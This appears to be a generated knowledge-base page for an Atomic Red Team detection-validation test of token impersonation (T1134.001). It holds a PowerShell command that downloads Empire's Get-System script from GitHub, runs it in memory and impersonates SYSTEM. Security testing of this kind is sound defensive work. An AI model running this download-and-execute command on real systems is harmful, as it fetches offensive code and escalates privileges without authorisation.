---
atomic_guid: "34f0a430-9d04-4d98-bcb5-1989f14719f0"
title: "`SeDebugPrivilege` token duplication"
framework: "atomic"
generated: "true"
attack_technique_id: "T1134.001"
attack_technique_name: "Access Token Manipulation: Token Impersonation/Theft"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1134.001/T1134.001.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "34f0a430-9d04-4d98-bcb5-1989f14719f0"
  - "`SeDebugPrivilege` token duplication"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# `SeDebugPrivilege` token duplication

Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script uses `SeDebugPrivilege` to obtain, duplicate and impersonate the token of a another process.
When executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).

## Metadata

- Atomic GUID: 34f0a430-9d04-4d98-bcb5-1989f14719f0
- Technique: T1134.001: Access Token Manipulation: Token Impersonation/Theft
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1134.001/T1134.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1134-access_token_manipulation|T1134.001]]

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1134.001/T1134.001.yaml)
